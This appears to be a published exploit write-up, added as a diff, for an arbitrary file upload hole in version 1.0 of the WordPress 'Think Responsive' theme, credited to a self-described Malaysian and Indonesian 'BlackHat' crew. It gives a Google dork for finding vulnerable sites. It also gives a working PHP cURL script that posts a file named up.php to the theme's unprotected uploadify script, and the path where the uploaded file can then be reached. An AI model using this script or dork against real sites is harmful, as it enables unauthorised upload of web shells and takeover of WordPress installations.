@@ -1,0 +1,43 @@
+###################################################################################################
+#_________            .___        _______                ___.   .__        
+#\_   ___ \  ____   __| _/____    \      \   ______  _  _\_ |__ |__| ____  
+#/    \  \/ /  _ \ / __ |/ __ \   /   |   \_/ __ \ \/ \/ /| __ \|  |/ __ \ 
+#\     \___(  <_> ) /_/ \  ___/  /    |    \  ___/\     / | \_\ \  \  ___/ 
+# \______  /\____/\____ |\___  > \____|__  /\___  >\/\_/  |___  /__|\___  >
+#        \/            \/    \/          \/     \/            \/        \/ 
+###################################################################################################
+# Exploit Title: WordPress Think Responsive Themes Arbitrary File Upload Vulnerability
+# Author: Byakuya
+# Date: 11/01/2013
+# Vendor Homepage: http://themeforest.net/
+# Themes Link: http://themeforest.net/item/think-responsive-portfolio-and-blog/2281513
+# Price: $40
+# Affected Version: v1.0
+# Infected File: upload_settings_image.php
+# Category: webapps/php
+# Google dork: inurl:/wp-content/themes/thinkresponsive
+# Tested on : Windows/Linux
+###################################################################################################
+
+# Exploit & POC :
+
+<?php
+$uploadfile="up.php";
+$ch = curl_init("http://127.0.0.1/wordpress/wp-content/themes/ThinkResponsive/includes/uploadify/upload_settings_image.php");
+curl_setopt($ch, CURLOPT_POST, true);  
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+        array('Filedata'=>"@$uploadfile"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+?>
+
+#File path: 
+http://127.0.0.1/wordpress/wp-content/uploads/settingsimages/up.php
+
+#Credit: ./Byakuya ./Mr Ohsem ./Cai ./RatKid ./Agam ./Lord-Router ./X-Tuned ./Official Code-Newbie ./Newbie-Security
+#Facebook: https://www.facebook.com/CodeNewbieCrew
+#Website: http://www.codenewbie.net
+#Malaysia & Indonesia BlackHat
+###################################################################################################
